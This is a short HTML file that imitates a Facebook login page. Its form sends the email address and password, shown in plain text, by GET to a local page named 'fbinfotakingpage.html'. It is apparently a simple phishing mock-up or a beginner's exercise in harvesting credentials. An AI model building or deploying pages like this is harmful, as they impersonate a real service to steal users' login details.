<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook log in page</title>
</head>
<body>
    <form action="./fbinfotakingpage.html" method="get">
        <fieldset style="width: 400px; position: absolute; left: 450px;" >
            <legend>log in</legend>
        <label for="email">Email address:</label><br><br>
        <input type="email" id="email" name="inp" placeholder="Email address" required><br><br>
        <label for="password">Password:</label><br><br>
        <input type="text" id="password" name="inp" placeholder="Password" required><br><br>
        <input type="submit" value="submit">
        <input type="reset" value="reset">
    </fieldset>
    </form>
</body>
</html>
